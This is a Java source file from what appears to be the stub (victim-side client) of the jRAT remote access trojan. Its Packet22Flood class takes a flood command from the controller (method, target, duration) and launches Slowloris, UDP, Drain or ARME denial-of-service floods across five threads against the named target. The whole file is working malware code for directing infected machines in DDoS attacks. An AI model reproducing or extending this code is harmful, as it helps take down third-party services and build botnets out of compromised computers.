package se.jrat.stub.packets.incoming;

import se.jrat.common.Flood;
import se.jrat.stub.Connection;
import se.jrat.stub.Constants;
import se.jrat.stub.flood.ARME;
import se.jrat.stub.flood.Drain;
import se.jrat.stub.flood.Slowloris;
import se.jrat.stub.flood.ThreadFlood;
import se.jrat.stub.flood.UDP;

public class Packet22Flood extends AbstractIncomingPacket {

	public static final int THREADS = 5;

	@Override
	public void read() throws Exception {
		int method = Connection.readInt();
		String target = Connection.readLine();
		int seconds = Connection.readInt();

		if (method == Flood.SLOWLORIS.getNumeric()) {
			start(new Slowloris(target, Constants.HTTP_GET), seconds);
		}  else if (method == Flood.UDP.getNumeric()) {
			start(new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		} else if (method == Flood.DRAIN.getNumeric()) {
			start(new Drain(target), seconds);
		} else if (method == Flood.ARME.getNumeric()) {
			start(new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		}
	}

	public static void start(Runnable flood, int seconds) {
		new Thread(new ThreadFlood(seconds)).start();

		for (int i = 0; i < THREADS; i++) {
			new Thread(flood).start();
		}

	}

}
